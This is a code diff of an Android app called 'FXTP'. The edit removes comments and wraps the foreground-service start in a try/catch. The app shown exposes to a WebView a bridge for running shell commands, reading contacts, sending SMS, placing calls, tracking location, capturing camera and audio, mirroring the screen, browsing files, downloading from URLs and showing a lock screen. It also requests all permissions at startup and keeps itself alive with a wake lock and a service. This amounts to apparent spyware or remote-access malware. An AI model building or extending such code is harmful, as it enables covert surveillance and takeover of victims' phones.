@@ -5,7 +5,6 @@ import android.app.NotificationChannel;
 import android.app.NotificationManager;
 import android.content.ClipData;
 import android.content.ClipboardManager;
-import android.content.ComponentName;
 import android.content.ContentResolver;
 import android.content.Context;
 import android.content.Intent;
@@ -82,17 +81,20 @@ public class MainActivity extends AppCompatActivity {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
 
-        // Wake lock – keep screen on
+        // Wake lock
         PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
         if (pm != null) {
             wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "FXTP:WakeLock");
-            wakeLock.acquire(10*60*1000L /*10 minutes*/);
+            wakeLock.acquire(10*60*1000L);
         }
 
-        // Foreground service
-        startForegroundService(new Intent(this, ServerService.class));
+        // Foreground service – wrapped in try/catch to avoid crash if service not declared
+        try {
+            startForegroundService(new Intent(this, ServerService.class));
+        } catch (Exception e) {
+            Log.e("FXTP", "Service start failed", e);
+        }
 
-        // WebView
         webView = findViewById(R.id.webView);
         WebSettings settings = webView.getSettings();
         settings.setJavaScriptEnabled(true);
@@ -106,10 +108,8 @@ public class MainActivity extends AppCompatActivity {
         webView.addJavascriptInterface(new AndroidBridge(), "AndroidBridge");
         webView.loadUrl("file:///android_asset/device.html");
 
-        // Request all permissions on startup
         requestAllPermissions();
 
-        // Camera manager
         cameraManager = (CameraManager) getSystemService(Context.CAMERA_SERVICE);
         try {
             for (String id : cameraManager.getCameraIdList()) {
@@ -123,7 +123,7 @@ public class MainActivity extends AppCompatActivity {
             e.printStackTrace();
         }
 
-        Log.d("FXTP", "App started with full features");
+        Log.d("FXTP", "App started");
     }
 
     private void requestAllPermissions() {
@@ -153,7 +153,6 @@ public class MainActivity extends AppCompatActivity {
                 needed.add(p);
             }
         }
-        // Also check overlay permission separately
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
             Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                     Uri.parse("package:" + getPackageName()));
@@ -175,11 +174,10 @@ public class MainActivity extends AppCompatActivity {
             webView.loadUrl("javascript:if(window.handleBridgeResult) window.handleBridgeResult('camera_data', '" + base64 + "');");
         }
         if (requestCode == 1002) {
-            // Overlay permission result – handled elsewhere
+            // overlay result
         }
     }
 
-    // ==================== ANDROID BRIDGE ====================
     private class AndroidBridge {
 
         @JavascriptInterface
@@ -192,7 +190,6 @@ public class MainActivity extends AppCompatActivity {
             return "pong";
         }
 
-        // --- Screenshot (Canvas) ---
         @JavascriptInterface
         public String takeScreenshot() {
             try {
@@ -210,7 +207,6 @@ public class MainActivity extends AppCompatActivity {
             }
         }
 
-        // --- Mirror (sends frames) ---
         @JavascriptInterface
         public String startMirror() {
             if (isMirroring) return "Already mirroring";
@@ -243,7 +239,6 @@ public class MainActivity extends AppCompatActivity {
             return "Mirror stopped";
         }
 
-        // --- Shell ---
         @JavascriptInterface
         public String runShell(String cmd) {
             try {
@@ -259,7 +254,6 @@ public class MainActivity extends AppCompatActivity {
             }
         }
 
-        // --- Launch App (fixed) ---
         @JavascriptInterface
         public String launchApp(String pkg) {
             try {
@@ -282,7 +276,6 @@ public class MainActivity extends AppCompatActivity {
             }
         }
 
-        // --- File Manager ---
         @JavascriptInterface
         public String listFiles(String path) {
             try {
@@ -320,7 +313,6 @@ public class MainActivity extends AppCompatActivity {
             }
         }
 
-        // --- Notification ---
         @JavascriptInterface
         public String sendNotification(String msg) {
             try {
@@ -345,7 +337,6 @@ public class MainActivity extends AppCompatActivity {
             }
         }
 
-        // --- Clipboard ---
         @JavascriptInterface
         public String setClipboard(String text) {
             try {
@@ -373,7 +364,6 @@ public class MainActivity extends AppCompatActivity {
             }
         }
 
-        // --- SMS ---
         @JavascriptInterface
         public String sendSms(String data) {
             try {
@@ -389,7 +379,6 @@ public class MainActivity extends AppCompatActivity {
             }
         }
 
-        // --- Contacts ---
         @JavascriptInterface
         public String getContacts() {
             try {
@@ -413,7 +402,6 @@ public class MainActivity extends AppCompatActivity {
             }
         }
 
-        // --- Location ---
         @JavascriptInterface
         public String getLocation() {
             try {
@@ -437,7 +425,6 @@ public class MainActivity extends AppCompatActivity {
             }
         }
 
-        // --- Camera ---
         @JavascriptInterface
         public String captureCamera() {
             try {
@@ -449,7 +436,6 @@ public class MainActivity extends AppCompatActivity {
             }
         }
 
-        // --- Audio Recording ---
         @JavascriptInterface
         public String startAudioRecording(int duration) {
             if (isRecording) return "Already recording";
@@ -498,7 +484,6 @@ public class MainActivity extends AppCompatActivity {
             }
         }
 
-        // --- Device Info ---
         @JavascriptInterface
         public String getDeviceInfo() {
             try {
@@ -557,7 +542,6 @@ public class MainActivity extends AppCompatActivity {
             return "unknown";
         }
 
-        // --- Packages ---
         @JavascriptInterface
         public String getPackages() {
             try {
@@ -572,7 +556,6 @@ public class MainActivity extends AppCompatActivity {
             }
         }
 
-        // --- WiFi ---
         @JavascriptInterface
         public String scanWifi() {
             try {
@@ -595,7 +578,6 @@ public class MainActivity extends AppCompatActivity {
             }
         }
 
-        // --- Flashlight ---
         @JavascriptInterface
         public String toggleFlashlight(boolean on) {
             try {
@@ -606,7 +588,6 @@ public class MainActivity extends AppCompatActivity {
             }
         }
 
-        // --- Vibrate ---
         @JavascriptInterface
         public String vibrate(int duration) {
             if (ContextCompat.checkSelfPermission(MainActivity.this, android.Manifest.permission.VIBRATE) != PackageManager.PERMISSION_GRANTED) {
@@ -624,7 +605,6 @@ public class MainActivity extends AppCompatActivity {
             }
         }
 
-        // --- Brightness (system settings) ---
         @JavascriptInterface
         public String setBrightness(int value) {
             try {
@@ -644,7 +624,6 @@ public class MainActivity extends AppCompatActivity {
             }
         }
 
-        // --- Volume ---
         @JavascriptInterface
         public String setVolume(int value) {
             try {
@@ -660,7 +639,6 @@ public class MainActivity extends AppCompatActivity {
             }
         }
 
-        // --- Download from URL ---
         @JavascriptInterface
         public String downloadFromUrl(String urlStr) {
             try {
@@ -683,7 +661,6 @@ public class MainActivity extends AppCompatActivity {
             }
         }
 
-        // --- Call ---
         @JavascriptInterface
         public String makeCall(String number) {
             try {
@@ -700,7 +677,6 @@ public class MainActivity extends AppCompatActivity {
             }
         }
 
-        // --- Lock Screen ---
         @JavascriptInterface
         public String startLockScreen() {
             Intent lockIntent = new Intent(MainActivity.this, LockActivity.class);
@@ -709,7 +685,6 @@ public class MainActivity extends AppCompatActivity {
             return "Lock screen activated";
         }
 
-        // --- Display HTML ---
         @JavascriptInterface
         public String displayHtml(String html) {
             Intent intent = new Intent(MainActivity.this, LockActivity.class);
@@ -724,10 +699,10 @@ public class MainActivity extends AppCompatActivity {
     protected void onDestroy() {
         super.onDestroy();
         if (wakeLock != null && wakeLock.isHeld()) wakeLock.release();
-        if (isMirroring) isMirroring = false;
+        isMirroring = false;
         if (audioRecorder != null) {
             try { audioRecorder.stop(); audioRecorder.release(); } catch (Exception e) {}
             audioRecorder = null;
         }
     }
-                    }
+                }
